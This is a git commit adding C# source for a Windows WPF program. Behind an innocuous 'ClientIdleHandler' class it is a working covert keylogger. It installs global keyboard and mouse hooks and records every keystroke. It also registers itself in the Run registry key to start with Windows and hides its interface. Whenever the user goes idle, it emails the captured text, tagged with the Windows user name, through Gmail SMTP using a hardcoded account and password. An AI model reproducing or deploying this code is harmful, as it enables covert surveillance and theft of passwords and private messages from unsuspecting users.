14c30d76c70a167655ae683e0d7adcfc7f991b4e
Frisk <quickben22@gmail.com>
2015-01-21 09:31:21 +0100

    Pocetak

---
+++ ClientIdleHandler.cs
@@ -0,0 +1,313 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace WpfApplication69
+{
+    public class ClientIdleHandler : IDisposable
+    {
+        public bool IsActive { get; set; }
+        public bool IsClick { get; set; }
+
+        int _hHookKbd;
+        public string pamcenje = "";
+        int _hHookMouse;
+
+        bool shift = false;
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
+        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+        public event HookProc MouseHookProcedure;
+        public event HookProc KbdHookProcedure;
+
+        //Use this function to install thread-specific hook.
+        [DllImport("user32.dll", CharSet = CharSet.Auto,
+             CallingConvention = CallingConvention.StdCall)]
+        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn,
+            IntPtr hInstance, int threadId);
+
+        //Call this function to uninstall the hook.
+        [DllImport("user32.dll", CharSet = CharSet.Auto,
+             CallingConvention = CallingConvention.StdCall)]
+        public static extern bool UnhookWindowsHookEx(int idHook);
+
+        //Use this function to pass the hook information to next hook procedure in chain.
+        [DllImport("user32.dll", CharSet = CharSet.Auto,
+             CallingConvention = CallingConvention.StdCall)]
+        public static extern int CallNextHookEx(int idHook, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        //Use this hook to get the module handle, needed for WPF environment
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+
+        [DllImport("user32.dll")]
+        static extern int MapVirtualKey(int uCode, int uMapType);
+
+        public enum HookType : int
+        {
+            GlobalKeyboard = 13,
+            GlobalMouse = 14
+        }
+
+        public int MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            //user is active, at least with the mouse
+            IsActive = true;
+            if (wParam.ToString() == "513")
+                IsClick = true;
+            else
+                IsClick = false;
+            //Console.WriteLine("desava se" + wParam.ToString() +"  i  " +lParam.ToString());
+            Debug.Print("Mouse active");
+
+            //just return the next hook
+            return CallNextHookEx(_hHookMouse, nCode, wParam, lParam);
+        }
+
+        public int KbdHookProc(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            //user is active, at least with the keyboard
+            IsActive = true;
+           
+            Debug.Print("Keyboard active");
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+             
+                //KeysConverter kc = new KeysConverter();
+                //string keyChar = kc.ConvertToString(((Keys)vkCode));
+            
+
+               
+
+                
+
+                Console.WriteLine(((Keys)vkCode).ToString());
+
+
+                if (((Keys)vkCode).ToString() == "Space")
+                {
+                    pamcenje += (" ");
+                }
+                else if (((Keys)vkCode).ToString() == "Back")
+                {
+                   // Console.WriteLine("vrijedi1");
+                    if (pamcenje.Length > 0)
+                    {
+                        string pomocni = pamcenje.Substring(0, pamcenje.Length - 1);
+                        pamcenje = pomocni;
+                    }
+                }
+                else if (((Keys)vkCode).ToString() == "Return")
+                {
+                   // Console.WriteLine("vrijedi2");
+                    pamcenje += ("\n");
+                }
+                else if (((Keys)vkCode).ToString() == "Left" ||((Keys)vkCode).ToString() == "Right" ||((Keys)vkCode).ToString() == "Up" ||((Keys)vkCode).ToString() == "Down"  )
+                {
+                    // Console.WriteLine("vrijedi2");
+                    pamcenje += ((Keys)vkCode).ToString();
+                }
+                else if (((Keys)vkCode).ToString() == "Enter")
+                {
+                    // Console.WriteLine("vrijedi2");
+                    pamcenje += ("\n");
+                }
+                else if (((Keys)vkCode).ToString() == "Oemtilde")
+                {
+                    pamcenje += ("¸");
+                }
+                else if (((Keys)vkCode).ToString() == "Tab")
+                {
+                    pamcenje += ("\t");
+                }
+                 else if (((Keys)vkCode).ToString() == "LControlKey")
+                {
+                    pamcenje += ((Keys)vkCode).ToString();
+                 }
+                else if (((Keys)vkCode).ToString() == "RControlKey")
+                {
+                    pamcenje += ((Keys)vkCode).ToString();
+                }
+                else if (((Keys)vkCode).ToString() != "Capital" && ((Keys)vkCode).ToString() != "RShiftKey" && ((Keys)vkCode).ToString() != "LShiftKey")
+                {
+                    if (shift == false)
+                    {
+                        int nonVirtualKey = MapVirtualKey(vkCode, 2);
+                        if (nonVirtualKey > 64 && nonVirtualKey < 91)
+                            nonVirtualKey += 32;
+
+                        char mappedChar = Convert.ToChar(nonVirtualKey);
+
+                        pamcenje += mappedChar.ToString();
+                    }
+                    else
+                    {
+                        int nonVirtualKey = MapVirtualKey(vkCode, 2);
+                        char mappedChar = Convert.ToChar(nonVirtualKey);
+
+
+                        switch (((Keys)vkCode).ToString())
+                        {
+                            case "D1":
+                                pamcenje += "!";
+                                break;
+                            case "D2":
+                                pamcenje += "\"";
+                                break;
+                            case "D3":
+                                pamcenje += "#";
+                                break;
+                            case "D4":
+                                pamcenje += "$";
+                                break;
+                            case "D5":
+                                pamcenje += "%";
+                                break;
+                            case "D6":
+                                pamcenje += "&";
+                                break;
+                            case "D7":
+                                pamcenje += "/";
+                                break;
+                            case "D8":
+                                pamcenje += "(";
+                                break;
+                            case "D9":
+                                pamcenje += ")";
+                                break;
+                            case "D0":
+                                pamcenje += "=";
+                                break;
+                            case "OemQuestion":
+                                pamcenje += "?";
+                                break;
+                            case "Oemplus":
+                                pamcenje += "*";
+                                break;
+                            case "Oemcomma":
+                                pamcenje += ";";
+                                break;
+                            case "OemPeriod":
+                                pamcenje += ":";
+                                break;
+                            case "OemMinus":
+                                pamcenje += "_";
+                                break;
+                            case "OemBackslash":
+                                pamcenje += ">";
+                                break;
+
+                            default:
+                                pamcenje += mappedChar.ToString();
+                                break;
+
+                        }
+                    }
+
+
+                }
+
+                if (((Keys)vkCode).ToString() == "LShiftKey" || ((Keys)vkCode).ToString() == "RShiftKey")
+                {
+                    shift = true;
+                }
+               
+
+
+            }
+
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                if (((Keys)vkCode).ToString() == "LShiftKey" || ((Keys)vkCode).ToString() == "RShiftKey")
+                {
+                    shift = false;
+                }
+            }
+
+           // Console.WriteLine("param= "+nCode.ToString()+"  i  " + wParam.ToString() +" i "+ lParam.ToString());
+            //just return the next hook
+            return CallNextHookEx(_hHookKbd, nCode, wParam, lParam);
+        }
+
+        public void Start()
+        {
+            using (var currentProcess = Process.GetCurrentProcess())
+            using (var mainModule = currentProcess.MainModule)
+            {
+
+                if (_hHookMouse == 0)
+                {
+                    // Create an instance of HookProc.
+                    MouseHookProcedure = new HookProc(MouseHookProc);
+                    // Create an instance of HookProc.
+                    KbdHookProcedure = new HookProc(KbdHookProc);
+
+                    //register a global hook
+                    _hHookMouse = SetWindowsHookEx((int)HookType.GlobalMouse,
+                                                  MouseHookProcedure,
+                                                  GetModuleHandle(mainModule.ModuleName),
+                                                  0);
+                    if (_hHookMouse == 0)
+                    {
+                        Close();
+                        throw new ApplicationException("SetWindowsHookEx() failed for the mouse");
+                    }
+                }
+
+                if (_hHookKbd == 0)
+                {
+                    //register a global hook
+                    _hHookKbd = SetWindowsHookEx((int)HookType.GlobalKeyboard,
+                                                KbdHookProcedure,
+                                                GetModuleHandle(mainModule.ModuleName),
+                                                0);
+                    if (_hHookKbd == 0)
+                    {
+                        Close();
+                        throw new ApplicationException("SetWindowsHookEx() failed for the keyboard");
+                    }
+                }
+            }
+        }
+
+        public void Close()
+        {
+            if (_hHookMouse != 0)
+            {
+                bool ret = UnhookWindowsHookEx(_hHookMouse);
+                if (ret == false)
+                {
+                    throw new ApplicationException("UnhookWindowsHookEx() failed for the mouse");
+                }
+                _hHookMouse = 0;
+            }
+
+            if (_hHookKbd != 0)
+            {
+                bool ret = UnhookWindowsHookEx(_hHookKbd);
+                if (ret == false)
+                {
+                    throw new ApplicationException("UnhookWindowsHookEx() failed for the keyboard");
+                }
+                _hHookKbd = 0;
+            }
+        }
+
+        #region IDisposable Members
+
+        public void Dispose()
+        {
+            if (_hHookMouse != 0 || _hHookKbd != 0)
+                Close();
+        }
+
+        #endregion
+    }
+}
---
+++ Window1.xaml.cs
@@ -0,0 +1,226 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+using System.Windows.Forms;
+using System.Windows.Threading;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net.Mail;
+using System.Net;
+using Microsoft.Win32;
+using System.Security.Principal;
+
+namespace WpfApplication69
+{
+    /// <summary>
+    /// Interaction logic for Window1.xaml
+    /// </summary>
+    public partial class Window1 : Window
+    {
+        private ClientIdleHandler _clientIdleHandler;
+        bool dal_idle = false;
+        DispatcherTimer dt = new DispatcherTimer();
+        Stopwatch stopWatch = new Stopwatch();
+        string currentTime = string.Empty;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool AllocConsole();
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+
+        TimeSpan ts3 = new TimeSpan(3000000000000);
+
+        public Window1()
+        {
+            InitializeComponent();
+            dt.Tick += new EventHandler(dt_Tick);
+            dt.Interval = new TimeSpan(0, 0, 0, 0, 1);
+        }
+
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+         //   AllocConsole();
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            if (rkApp.GetValue("WpfApplication69") == null)
+            {
+                rkApp.SetValue("WpfApplication69", System.Windows.Forms.Application.ExecutablePath.ToString());
+            }
+            else
+            {
+          //      Console.WriteLine("postavljeno");
+            }
+            //IntPtr hWnd = FindWindow(null, "Spijun");
+            //if (hWnd != IntPtr.Zero)
+            //{
+            //    //Hide the window
+            //    ShowWindow(hWnd, 0); // 0 = SW_HIDE
+            //}
+            click();
+            glava.Visibility = Visibility.Hidden;
+            
+        }
+
+        void dt_Tick(object sender, EventArgs e)
+        {
+            if (stopWatch.IsRunning)
+            {
+                TimeSpan ts2 = new TimeSpan(3000000000000);
+                TimeSpan ts = ts2 - stopWatch.Elapsed;
+               
+                currentTime = String.Format("{0:00}:{1:00}:{2:00}",
+                    ts.Hours, ts.Minutes, ts.Seconds);
+                textBlock2.Text = currentTime;
+                textBlock1.Text = GetMousePositionWindowsForms().X.ToString() + " , " + GetMousePositionWindowsForms().Y.ToString();
+                if (ts == new TimeSpan(0))
+                {
+                    stopWatch.Stop();
+                   // mailaj2(_clientIdleHandler.pamcenje);
+                   // Console.WriteLine(_clientIdleHandler.pamcenje);
+                    _clientIdleHandler.Dispose();
+
+                }
+
+                if (_clientIdleHandler.IsActive)
+                {
+                    dal_idle = false;
+                    ts3 = ts;
+
+                  //  Console.WriteLine("radi? " + ts3.ToString() +" i "+ ts.Seconds.ToString());
+                    //  Console.WriteLine("Active");
+                    //reset IsActive flag
+                    _clientIdleHandler.IsActive = false;
+
+
+                   
+                        
+                      //if(Keyboard.IsKeyDown(Key.A)) Console.WriteLine("a");
+                      //else if (Keyboard.IsKeyDown(Key.B)) Console.WriteLine("b");
+                      //else if (Keyboard.IsKeyDown(Key.C)) Console.WriteLine("c");
+                      //else if (Keyboard.IsKeyDown(Key.D)) Console.WriteLine("d");
+                      //else if (Keyboard.IsKeyDown(Key.E)) Console.WriteLine("e");
+                      //else if (Keyboard.IsKeyDown(Key.F)) Console.WriteLine("f");
+                      //else if (Keyboard.IsKeyDown(Key.G)) Console.WriteLine("g");
+                      //else if (Keyboard.IsKeyDown(Key.H)) Console.WriteLine("h");
+                      //else if (Keyboard.IsKeyDown(Key.I)) Console.WriteLine("i");
+                      //else if (Keyboard.IsKeyDown(Key.J)) Console.WriteLine("j");
+                      //else if (Keyboard.IsKeyDown(Key.K)) Console.WriteLine("k");
+                      //else if (Keyboard.IsKeyDown(Key.L)) Console.WriteLine("l");
+                      //else if (Keyboard.IsKeyDown(Key.M)) Console.WriteLine("m");
+                      //else if (Keyboard.IsKeyDown(Key.N)) Console.WriteLine("n");
+                      //else if (Keyboard.IsKeyDown(Key.O)) Console.WriteLine("o");
+                      //else if (Keyboard.IsKeyDown(Key.P)) Console.WriteLine("p");
+                      //else if (Keyboard.IsKeyDown(Key.R)) Console.WriteLine("r");
+                      //else if (Keyboard.IsKeyDown(Key.S)) Console.WriteLine("s");
+                      //else if (Keyboard.IsKeyDown(Key.T)) Console.WriteLine("t");
+                      //else if (Keyboard.IsKeyDown(Key.U)) Console.WriteLine("u");
+                      //else if (Keyboard.IsKeyDown(Key.V)) Console.WriteLine("v");
+                      //else if (Keyboard.IsKeyDown(Key.Z)) Console.WriteLine("z");
+                      //else if (Keyboard.IsKeyDown(Key.X)) Console.WriteLine("x");
+                      //else if (Keyboard.IsKeyDown(Key.Y)) Console.WriteLine("y");
+                    
+                    //if (_clientIdleHandler.IsClick == true)
+                    //{
+
+                    
+                    //    //Console.WriteLine("kiflon " + mouseposition.ToString());
+                       
+                    //    stopWatch.Stop();
+                    //    _clientIdleHandler.IsClick = false;
+                    //}
+                }
+                else
+                {
+                   // Console.WriteLine("nnn? " + ts3.ToString() + " i " + ts.Seconds.ToString());
+
+                    if (ts3 - ts > new TimeSpan(200000000) && dal_idle == false)
+                    {
+                     
+                        mailaj2(_clientIdleHandler.pamcenje);
+                        _clientIdleHandler.pamcenje = "";
+                        dal_idle = true;
+                    //    Console.WriteLine("Idle");
+                    }
+                }
+
+
+            }
+        }
+
+
+        private void mailaj2(string Body)
+        {
+
+            MailMessage mail = new MailMessage();
+            mail.To.Add("ristovski007@gmail.com");
+            mail.From = new MailAddress("ristovski007@gmail.com");
+
+            string subjekt = WindowsIdentity.GetCurrent().Name.ToString() + " - " + DateTime.Now.ToString(); 
+           
+            mail.Subject = subjekt;
+
+          
+            mail.Body = Body;
+
+            mail.IsBodyHtml = false;
+
+            SmtpClient sc = new SmtpClient("smtp.gmail.com");
+            NetworkCredential nc = new NetworkCredential("ristovski007", "4835083090407");//username doesn't include @gmail.com
+            sc.UseDefaultCredentials = false;
+            sc.Credentials = nc;
+            sc.EnableSsl = true;
+            sc.Port = 587;
+            try
+            {
+                sc.Send(mail);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+
+
+        private void button1_Click(object sender, RoutedEventArgs e)
+        {
+            click();
+           
+        }
+
+        private void click()
+        {
+            ts3 = new TimeSpan(3000000000000);
+            if (_clientIdleHandler != null)
+                _clientIdleHandler.Dispose();
+            _clientIdleHandler = new ClientIdleHandler();
+            _clientIdleHandler.Start();
+            stopWatch.Reset();
+            stopWatch.Start();
+            dt.Start();
+        }
+
+        public Point GetMousePositionWindowsForms()
+        {
+            
+            
+            System.Drawing.Point point = System.Windows.Forms.Control.MousePosition;
+            return new Point(point.X, point.Y);
+        }
+
+    }
+}
